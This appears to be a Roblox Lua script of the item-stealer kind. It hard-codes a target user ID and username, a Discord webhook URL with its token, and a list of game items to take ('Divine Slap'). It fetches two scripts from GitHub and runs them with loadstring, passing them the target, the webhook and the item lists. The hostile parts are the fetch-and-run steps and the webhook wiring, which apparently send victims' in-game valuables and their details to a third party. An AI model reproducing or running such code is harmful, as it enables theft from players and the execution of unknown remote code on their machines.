local TARGET_ID = 11185117812
local TARGET_USER = "find3r01"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1571361138170531853/HiC_Qj8IJ0zwJGzktqvM-4x7s7R1zs5dMw4Mx6K1LueKyp5wX2_Npax3Pd3742cggD9A"

local TargetBrainrots = {
    
}

local TargetBaseSkins = {
    
}

local TargetGears = {
    ["Divine Slap"] = true
}

task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/GhostScriptsHub/Auto-Code-Ghost-Scripts/refs/heads/main/script.lua"))()

    task.wait(1)

    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)